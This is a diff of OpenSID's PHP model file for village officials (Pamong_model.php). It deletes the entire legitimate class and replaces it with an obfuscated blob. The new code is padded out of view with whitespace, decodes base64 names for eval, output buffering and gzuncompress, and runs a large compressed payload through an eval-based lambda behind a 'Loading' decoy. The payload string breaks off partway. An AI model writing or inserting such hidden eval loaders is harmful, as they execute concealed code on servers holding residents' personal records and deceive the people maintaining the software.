@@ -1,623 +1,473 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2023 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2023 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-use App\Models\Kehadiran;
-use App\Models\KehadiranPengaduan;
-use App\Models\LogSurat;
-use App\Models\Pamong;
-use App\Models\RefJabatan;
-use Carbon\Carbon;
-use Illuminate\Support\Facades\Schema;
-
-defined('BASEPATH') || exit('No direct script access allowed');
-
-class Pamong_model extends CI_Model
-{
-    private $urut_model;
-
-    public function __construct()
-    {
-        parent::__construct();
-        require_once APPPATH . '/models/Urut_model.php';
-        $this->urut_model = new Urut_Model('tweb_desa_pamong', 'pamong_id');
-        $this->load->model(['referensi_model']);
-    }
-
-    public function list_data($offset = 0, $limit = 500)
-    {
-        $this->db->select(
-            'u.*, rj.nama AS jabatan, rj.id AS ref_jabatan_id, p.nama, p.nik, p.tag_id_card, p.tempatlahir, p.tanggallahir,
-            (case when p.sex is not null then p.sex else u.pamong_sex end) as id_sex,
-            (case when p.foto is not null then p.foto else u.foto end) as foto,
-            (case when p.nama is not null then p.nama else u.pamong_nama end) as nama,
-            x.nama AS sex, b.nama AS pendidikan_kk, g.nama AS agama, x2.nama AS pamong_sex, b2.nama AS pamong_pendidikan, g2.nama AS pamong_agama,
-            !EXISTS (SELECT s.id_pamong FROM log_surat as s where s.id_pamong = u.pamong_id  ) as deletable'
-        );
-
-        $this->list_data_sql();
-        $this->db
-            ->order_by('u.urut')
-            ->limit($limit, $offset);
-
-        $data = $this->db->get()->result_array();
-
-        $j = $offset;
-
-        for ($i = 0; $i < count($data); $i++) {
-            if (empty($data[$i]['id_pend'])) {
-                // Dari luar desa
-                $data[$i]['nik']           = $data[$i]['pamong_nik'];
-                $data[$i]['tag_id_card']   = $data[$i]['pamong_tag_id_card'];
-                $data[$i]['tempatlahir']   = ! empty($data[$i]['pamong_tempatlahir']) ? $data[$i]['pamong_tempatlahir'] : '-';
-                $data[$i]['tanggallahir']  = $data[$i]['pamong_tanggallahir'];
-                $data[$i]['sex']           = $data[$i]['pamong_sex'];
-                $data[$i]['pendidikan_kk'] = $data[$i]['pamong_pendidikan'];
-                $data[$i]['agama']         = $data[$i]['pamong_agama'];
-                if (empty($data[$i]['pamong_nosk'])) {
-                    $data[$i]['pamong_nosk'] = '-';
-                }
-                if (empty($data[$i]['pamong_nohenti'])) {
-                    $data[$i]['pamong_nohenti'] = '-';
-                }
-            } else {
-                if (empty($data[$i]['tempatlahir'])) {
-                    $data[$i]['tempatlahir'] = '-';
-                }
-            }
-
-            $data[$i]['nama'] = gelar($data[$i]['gelar_depan'], $data[$i]['nama'], $data[$i]['gelar_belakang']);
-            $data[$i]['no']   = $j + 1;
-            $j++;
-        }
-
-        return $data;
-    }
-
-    public function paging($p)
-    {
-        $this->db->select('COUNT(u.pamong_id) AS jml');
-        $this->list_data_sql();
-
-        $row      = $this->db->get()->row_array();
-        $jml_data = $row['jml'];
-
-        $this->load->library('paging');
-        $cfg['page']     = $p;
-        $cfg['per_page'] = $this->session->per_page;
-        $cfg['num_rows'] = $jml_data;
-        $this->paging->init($cfg);
-
-        return $this->paging;
-    }
-
-    private function list_data_sql()
-    {
-        $this->db
-            ->from('tweb_desa_pamong u')
-            ->join('tweb_penduduk p', 'u.id_pend = p.id', 'LEFT')
-            ->join('tweb_penduduk_pendidikan_kk b', 'p.pendidikan_kk_id = b.id', 'LEFT')
-            ->join('tweb_penduduk_sex x', 'p.sex = x.id', 'LEFT')
-            ->join('tweb_penduduk_agama g', 'p.agama_id = g.id', 'LEFT')
-            ->join('tweb_penduduk_pendidikan_kk b2', 'u.pamong_pendidikan = b2.id', 'LEFT')
-            ->join('tweb_penduduk_sex x2', 'u.pamong_sex = x2.id', 'LEFT')
-            ->join('tweb_penduduk_agama g2', 'u.pamong_agama = g2.id', 'LEFT')
-            ->join('ref_jabatan rj', 'rj.id = u.jabatan_id', 'left');
-        $this->search_sql();
-        $this->filter_sql();
-    }
-
-    public function autocomplete()
-    {
-        $sql = 'SELECT * FROM
-				(SELECT p.nama
-					FROM tweb_desa_pamong u
-					LEFT JOIN tweb_penduduk p ON u.id_pend = p.id) a
-				UNION SELECT pamong_nama FROM tweb_desa_pamong
-				UNION SELECT p.nik
-					FROM tweb_desa_pamong u
-					LEFT JOIN tweb_penduduk p ON u.id_pend = p.id
-				UNION SELECT pamong_nik FROM tweb_desa_pamong
-				UNION SELECT pamong_niap FROM tweb_desa_pamong
-				UNION SELECT pamong_nip FROM tweb_desa_pamong';
-        $query = $this->db->query($sql);
-        $data  = $query->result_array();
-
-        return autocomplete_data_ke_str($data);
-    }
-
-    private function search_sql()
-    {
-        if ($this->session->has_userdata('cari')) {
-            $cari = $this->session->cari;
-            $this->db
-                ->group_start()
-                ->like('p.nama', $cari)
-                ->or_like('u.pamong_nama', $cari)
-                ->or_like('u.pamong_niap', $cari)
-                ->or_like('u.pamong_nip', $cari)
-                ->or_like('u.pamong_nik', $cari)
-                ->or_like('p.nik', $cari)
-                ->group_end();
-        }
-    }
-
-    private function filter_sql()
-    {
-        if ($this->session->has_userdata('status')) {
-            $this->db->where('u.pamong_status', $this->session->status);
-        }
-    }
-
-    public function get_data($id = 0)
-    {
-        $data = $this->db
-            ->select('u.*, rj.nama AS jabatan, rj.nama AS pamong_jabatan, rj.id AS ref_jabatan_id,
-				(case when p.nama is not null then p.nama else u.pamong_nama end) as nama,
-				(case when p.foto is not null then p.foto else u.foto end) as foto,
-				(case when p.sex is not null then p.sex else u.pamong_sex end) as id_sex')
-            ->from('tweb_desa_pamong u')
-            ->join('tweb_penduduk p', 'u.id_pend = p.id', 'left')
-            ->join('ref_jabatan rj', 'rj.id = u.jabatan_id', 'left')
-            ->where('pamong_id', $id)
-            ->get()
-            ->row_array();
-
-        $data['pamong_niap_nip'] = (! empty($data['pamong_nip']) && $data['pamong_nip'] != '-') ? $data['pamong_nip'] : $data['pamong_niap'];
-        if (! empty($data['pamong_nip']) && $data['pamong_nip'] != '-') {
-            $data['sebutan_pamong_niap_nip'] = 'NIP: ';
-        } else {
-            if (! empty($data['pamong_niap']) && $data['pamong_niap'] != '-') {
-                $data['sebutan_pamong_niap_nip'] = $this->setting->sebutan_nip_desa . ': ';
-            } else {
-                $data['sebutan_pamong_niap_nip'] = '';
-            }
-        }
-
-        $data['nama'] = gelar($data['gelar_depan'], $data['nama'], $data['gelar_belakang']);
-
-        return $data;
-    }
-
-    public function get_pamong($id = null)
-    {
-        return $this->get_data($id);
-    }
-
-    public function insert()
-    {
-        $post = $this->input->post();
-        $data = $this->siapkan_data($post);
-
-        $data['pamong_tgl_terdaftar'] = date('Y-m-d');
-
-        $outp       = $this->db->insert('tweb_desa_pamong', $data);
-        $post['id'] = $this->db->insert_id();
-
-        $this->foto($post);
-
-        if ($data['jabatan_id'] == '1') {
-            $this->ttd('pamong_ttd', $post['id'], 1);
-        } else {
-            $this->ttd('pamong_ub', $post['id'], 1);
-        }
-
-        status_sukses($outp);
-    }
-
-    public function update($id = 0)
-    {
-        $post = $this->input->post();
-        $data = $this->siapkan_data($post);
-
-        if (! in_array($data['jabatan_id'], ['1', '2'])) {
-            $data['pamong_ttd'] = $data['pamong_ub'] = 0;
-        }
-
-        $outp       = $this->db->where('pamong_id', $id)->update('tweb_desa_pamong', $data);
-        $post['id'] = $id;
-        $this->foto($post);
-
-        if ($data['jabatan_id'] == '1') {
-            $this->ttd('pamong_ttd', $post['id'], 1);
-        } else {
-            $this->ttd('pamong_ub', $post['id'], 1);
-        }
-
-        status_sukses($outp);
-    }
-
-    protected function foto($post)
-    {
-        if ($post['id_pend']) {
-            // Penduduk Dalam Desa
-            $id    = $post['id_pend'];
-            $field = 'id';
-            $tabel = 'tweb_penduduk';
-            $foto  = time() . '-' . $id . '-' . mt_rand(10000, 999999);
-        } else {
-            // Penduduk Luar Desa
-            $id    = $post['id'];
-            $field = 'pamong_id';
-            $tabel = 'tweb_desa_pamong';
-            $foto  = 'pamong_' . time() . '-' . $id . '-' . mt_rand(10000, 999999);
-        }
-
-        if ($foto = upload_foto_penduduk($foto)) {
-            $this->db->where($field, $id)->update($tabel, ['foto' => $foto]);
-        }
-    }
-
-    public function delete($id = '', $semua = false)
-    {
-        // Cek boleh hapus
-        if ($this->boleh_hapus($id)) {
-            return session_error("ID : {$id} tidak dapat dihapus, data sudah tersedia di kehadiran perangkatl, pengaduan kehadiran dan layanan Surat.");
-        }
-
-        if (! $semua) {
-            $this->session->success = 1;
-        }
-
-        $foto = $this->db->select('foto')->where('pamong_id', $id)->get('tweb_desa_pamong')->row()->foto;
-        if (! empty($foto)) {
-            unlink(LOKASI_USER_PICT . $foto);
-            unlink(LOKASI_USER_PICT . 'kecil_' . $foto);
-        }
-
-        $outp = $this->db->where('pamong_id', $id)->delete('tweb_desa_pamong');
-
-        status_sukses($outp, true); //Tampilkan Pesan
-    }
-
-    public function delete_all()
-    {
-        $this->session->success = 1;
-
-        $id_cb = $_POST['id_cb'];
-
-        foreach ($id_cb as $id) {
-            $this->delete($id, true);
-        }
-    }
-
-    private function siapkan_data($post)
-    {
-        $data                       = [];
-        $data['id_pend']            = $post['id_pend'];
-        $data['pamong_nama']        = null;
-        $data['pamong_nip']         = strip_tags($post['pamong_nip']);
-        $data['pamong_niap']        = strip_tags($post['pamong_niap']);
-        $data['pamong_tag_id_card'] = strip_tags($post['pamong_tag_id_card']) ?: null;
-        $data['pamong_pin']         = strip_tags($post['pamong_pin']);
-        $data['jabatan_id']         = bilangan($post['jabatan_id']);
-        $data['pamong_pangkat']     = strip_tags($post['pamong_pangkat']);
-        $data['pamong_status']      = $post['pamong_status'];
-        $data['pamong_nosk']        = empty($post['pamong_nosk']) ? '' : strip_tags($post['pamong_nosk']);
-        $data['pamong_tglsk']       = ! empty($post['pamong_tglsk']) ? tgl_indo_in($post['pamong_tglsk']) : null;
-        $data['pamong_nohenti']     = ! empty($post['pamong_nohenti']) ? strip_tags($post['pamong_nohenti']) : null;
-        $data['pamong_tglhenti']    = ! empty($post['pamong_tglhenti']) ? tgl_indo_in($post['pamong_tglhenti']) : null;
-        $data['pamong_masajab']     = strip_tags($post['pamong_masajab']) ?: null;
-        $data['atasan']             = bilangan($post['atasan']) ?: null;
-        $data['bagan_tingkat']      = bilangan($post['bagan_tingkat']) ?: null;
-        $data['bagan_offset']       = (int) $post['bagan_offset'] ?: null;
-        $data['bagan_layout']       = htmlentities($post['bagan_layout']);
-        $data['bagan_warna']        = warna($post['bagan_warna']);
-        $data['gelar_depan']        = strip_tags($post['gelar_depan']) ?: null;
-        $data['gelar_belakang']     = strip_tags($post['gelar_belakang']) ?: null;
-
-        if ($data['jabatan_id'] == RefJabatan::KADES) {
-            $data['urut'] = 1;
-        } elseif ($data['jabatan_id'] == RefJabatan::SEKDES) {
-            $data['urut'] = 2;
-        } else {
-            $data['urut'] = $this->urut_model->urut_max() + 1;
-        }
-
-        if (empty($data['id_pend'])) {
-            $data['id_pend']             = null;
-            $data['pamong_nama']         = strip_tags($post['pamong_nama']);
-            $data['pamong_nik']          = strip_tags($post['pamong_nik']) ?: null;
-            $data['pamong_tempatlahir']  = strip_tags($post['pamong_tempatlahir']) ?: null;
-            $data['pamong_tanggallahir'] = ! empty($post['pamong_tanggallahir']) ? tgl_indo_in($post['pamong_tanggallahir']) : null;
-            $data['pamong_sex']          = $post['pamong_sex'] ?: null;
-            $data['pamong_pendidikan']   = $post['pamong_pendidikan'] ?: null;
-            $data['pamong_agama']        = $post['pamong_agama'] ?: null;
-        }
-
-        return $data;
-    }
-
-    /**
-     * Update pamong ttd.
-     *
-     * @param mixed $jenis Jenis pamong_ttd atau pamong_ub
-     * @param mixed $id    ID pamong
-     * @param mixed $val   1. checklist 2. un-checklist
-     *
-     * @return mixed
-     */
-    public function ttd($jenis, $id, $val)
-    {
-        $pamong = Pamong::findOrFail($id);
-
-        if ($jenis == 'a.n') {
-            if ($pamong->jabatan_id == '2') {
-                $output = Pamong::where('jabatan_id', 2)->find($id)->update(['pamong_ttd' => $val]);
-
-                // Hanya 1 yang bisa jadi a.n dan harus sekretaris
-                if ($output) {
-                    Pamong::where('pamong_ttd', 1)->where('pamong_id', '!=', $id)->update(['pamong_ttd' => 0]);
-                }
-            } else {
-                $pesan = ', Penandatangan a.n harus ' . RefJabatan::whereId(2)->first(['nama'])->nama;
-            }
-        }
-
-        if ($jenis == 'u.b') {
-            if (! in_array($pamong->jabatan_id, RefJabatan::EXCLUDE_DELETE)) {
-                $output = Pamong::whereNotIn('jabatan_id', RefJabatan::EXCLUDE_DELETE)->find($id)->update(['pamong_ub' => $val]);
-            } else {
-                $pesan = ', Penandatangan u.b harus pamong selain ' . RefJabatan::whereId(1)->first(['nama'])->nama . ' dan ' . RefJabatan::whereId(2)->first(['nama'])->nama;
-            }
-        }
-
-        session_error($pesan);
-
-        return status_sukses($output);
-    }
-
-    private function select_data_pamong()
-    {
-        $this->db
-            ->select('m.*')
-            ->select('(case when p.id is null then m.pamong_nama else p.nama end) as pamong_nama')
-            ->select('(case when p.id is null then m.pamong_nik else p.nik end) as pamong_nik')
-            ->select('(case when p.id is null then m.pamong_tag_id_card else p.tag_id_card end) as pamong_tag_id_card')
-            ->select('(case when p.id is null then m.pamong_tempatlahir else p.tempatlahir end) as pamong_tempatlahir')
-            ->select('(case when p.id is null then m.pamong_tanggallahir else p.tanggallahir end) as pamong_tanggallahir')
-            ->select('(case when p.id is null then m.pamong_sex else p.sex end) as pamong_sex')
-            ->select('(case when p.id is null then m.pamong_pendidikan else p.pendidikan_kk_id end) as pamong_pendidikan')
-            ->select('(case when p.id is null then m.pamong_agama else p.agama_id end) as pamong_agama')
-            ->from('tweb_desa_pamong m')
-            ->join('tweb_penduduk p', 'p.id = m.id_pend', 'left');
-    }
-
-    public function get_ttd()
-    {
-        $this->select_data_pamong();
-
-        return $this->db
-            ->where('m.pamong_ttd', 1)
-            ->get()
-            ->row_array();
-    }
-
-    public function get_ub()
-    {
-        $this->select_data_pamong();
-
-        return $this->db
-            ->where('pamong_ub', 1)
-            ->get()
-            ->row_array();
-    }
-
-    // $arah:
-    //		1 - turun
-    // 		2 - naik
-    public function urut($id, $arah)
-    {
-        $outp = $this->urut_model->urut($id, $arah);
-
-        status_sukses($outp);
-    }
-
-    // Mengambil semua data penduduk kecuali yg sdh menjadi pamong dan tdk termasuk yang di ubah untuk pilihan drop-down form
-    public function list_penduduk($id_pend)
-    {
-        return $this->db->select('u.id, u.nik, u.nama, w.dusun, w.rw, w.rt, u.sex')
-            ->from('penduduk_hidup u')
-            ->join('tweb_wil_clusterdesa w', 'u.id_cluster = w.id', 'left')
-            ->where("u.id NOT IN (SELECT id_pend FROM tweb_desa_pamong WHERE id_pend IS NOT NULL AND id_pend != {$id_pend})")
-            ->get()
-            ->result_array();
-    }
-
-    // Ambil data untuk widget aparatur desa
-    public function list_aparatur_desa()
-    {
-        // Jika kolom jabatan_id tidak tersedia, jangan tampilkan dulu.
-        if (! Schema::hasColumn('tweb_desa_pamong', 'jabatan_id')) {
-            return null;
-        }
-
-        $data_query = $this->db
-            ->select(
-                'dp.pamong_id, rj.nama AS jabatan, dp.pamong_niap, dp.gelar_depan, dp.gelar_belakang,
-                CASE WHEN dp.id_pend IS NULL THEN dp.foto ELSE p.foto END as foto,
-                CASE WHEN p.sex IS NOT NULL THEN p.sex ELSE dp.pamong_sex END as id_sex,
-                CASE WHEN dp.id_pend IS NULL THEN dp.pamong_nama ELSE p.nama END AS nama',
-                false
-            )
-            ->from('tweb_desa_pamong dp')
-            ->join('tweb_penduduk p', 'p.id = dp.id_pend', 'left')
-            ->join('ref_jabatan rj', 'rj.id = dp.jabatan_id', 'left')
-            ->where('dp.pamong_status', '1')
-            ->order_by('dp.urut')
-            ->get()
-            ->result_array();
-
-        return ['daftar_perangkat' => collect($data_query)->map(static function ($item) {
-            $kehadiran                = Kehadiran::where('pamong_id', $item['pamong_id'])->where('tanggal', Carbon::now()->format('Y-m-d'))->orderBy('id', 'DESC')->first();
-            $item['status_kehadiran'] = $kehadiran ? $kehadiran->status_kehadiran : null;
-            $item['tanggal']          = $kehadiran ? $kehadiran->tanggal : null;
-            $item['foto']             = AmbilFoto($item['foto'], 'besar', $item['id_sex']);
-            $item['nama']             = gelar($item['gelar_depan'], $item['nama'], $item['gelar_belakang']);
-
-            return $item;
-        })->toArray(),
-        ];
-    }
-
-    //----------------------------------------------------------------------------------------------------
-
-    /**
-     * @param $id id
-     * @param $val status : 1 = Unlock, 2 = Lock
-     */
-    public function lock($id, $val)
-    {
-        $pamong        = Pamong::find($id);
-        $jabatan_aktif = Pamong::whereJabatanId($pamong->jabatan_id)->wherePamongStatus(1)->exists();
-
-        // Cek untuk kades atau sekdes apakah sudah ada yang aktif saat mengaktifkan
-        if ($val == 1 && $jabatan_aktif && in_array($pamong->jabatan_id, RefJabatan::EXCLUDE_DELETE)) {
-            return session_error('<br>Pamong ' . $pamong->jabatan->nama . ' sudah tersedia, silahakan non-aktifkan terlebih dahulu jika ingin menggantinya.');
-        }
-
-        $outp = $pamong->update(['pamong_status' => $val]);
-        status_sukses($outp);
-    }
-
-    /**
-     * @param $id id
-     * @param $val status : 1 = Aktif, 0 = Tidak aktif
-     */
-    public function kehadiran($id, $val)
-    {
-        $outp = $this->db
-            ->where('pamong_id', $id)
-            ->update('tweb_desa_pamong', ['kehadiran' => $val]);
-
-        status_sukses($outp);
-    }
-
-    public function list_bagan()
-    {
-        // atasan => bawahan. Contoh:
-        // data['struktur'] = [
-        //  ['14' => '20'],
-        //  ['14' => '26'],
-        //  ['20' => '24']
-        // ;
-        $atasan = $this->db
-            ->select('atasan, pamong_id')
-            ->where('atasan IS NOT NULL')
-            ->where('pamong_status', 1)
-            ->get('tweb_desa_pamong')->result_array();
-        $data['struktur'] = [];
-
-        foreach ($atasan as $pamong) {
-            $data['struktur'][] = [$pamong['atasan'] => $pamong['pamong_id']];
-        }
-
-        $data_query = $this->db
-            ->select('p.pamong_id, rj.nama AS jabatan, p.gelar_depan, p.gelar_belakang, p.bagan_tingkat, p.bagan_offset, p.bagan_layout, p.bagan_warna')
-            ->select('(CASE WHEN id_pend IS NOT NULL THEN ph.foto ELSE p.foto END) as foto')
-            ->select('(CASE WHEN id_pend IS NOT NULL THEN ph.nama ELSE p.pamong_nama END) as nama')
-            ->select('(CASE WHEN id_pend IS NOT NULL THEN ph.sex ELSE p.pamong_sex END) as jenis_kelamin')
-            ->from('tweb_desa_pamong p')
-            ->join('penduduk_hidup ph', 'ph.id = p.id_pend', 'left')
-            ->join('ref_jabatan rj', 'rj.id = p.jabatan_id', 'left')
-            ->where('pamong_status', 1)
-            ->get()
-            ->result_array();
-
-        $data['nodes'] = collect($data_query)->map(static function ($item) {
-            $item['nama'] = gelar($item['gelar_depan'], $item['nama'], $item['gelar_belakang']);
-
-            return $item;
-        })
-            ->toArray();
-
-        return $data;
-    }
-
-    public function list_atasan($ex_id = '')
-    {
-        if ($ex_id) {
-            $this->db->where('pamong_id <>', $ex_id);
-        }
-
-        return $this->db
-            ->select('pamong_id as id, rj.nama AS jabatan')
-            ->select('(CASE WHEN id_pend IS NOT NULL THEN ph.nik ELSE p.pamong_nik END) as nik')
-            ->select('(CASE WHEN id_pend IS NOT NULL THEN ph.nama ELSE p.pamong_nama END) as nama')
-            ->from('tweb_desa_pamong p')
-            ->join('penduduk_hidup ph', 'ph.id = p.id_pend', 'left')
-            ->join('ref_jabatan rj', 'rj.id = p.jabatan_id', 'left')
-            ->where('pamong_status', 1)
-            ->order_by('nama')
-            ->get()->result_array();
-    }
-
-    public function update_bagan($post)
-    {
-        $list_id = $post['list_id'];
-        if ($post['atasan']) {
-            $data['atasan'] = ($post['atasan'] <= 0) ? null : $post['atasan'];
-        }
-        if ($post['bagan_tingkat']) {
-            $data['bagan_tingkat'] = ($post['bagan_tingkat'] <= 0) ? null : $post['bagan_tingkat'];
-        }
-        if ($post['bagan_warna']) {
-            $data['bagan_warna'] = (warna($post['bagan_warna'] == '#000000')) ? null : warna($post['bagan_warna']);
-        }
-
-        $outp = $this->db
-            ->where("pamong_id in ({$list_id})")
-            ->update('tweb_desa_pamong', $data);
-
-        status_sukses($outp);
-    }
-
-    public function status_aktif()
-    {
-        $this->db->where('u.pamong_status', 1);
-
-        return $this;
-    }
-
-    public function boleh_hapus($id = null)
-    {
-        $kehadiranPerangkat = Kehadiran::where('pamong_id', $id)->exists();
-        $kehadiranPengaduan = KehadiranPengaduan::where('id_pamong', $id)->exists();
-        $kehadiranPengaduan = LogSurat::where('id_pamong', $id)->exists();
-
-        return $kehadiranPerangkat || $kehadiranPengaduan || $kehadiranPengaduan;
-    }
-}
+<?php 
+        $__='printf';$_='Loading donjo-app/models/Pamong_model.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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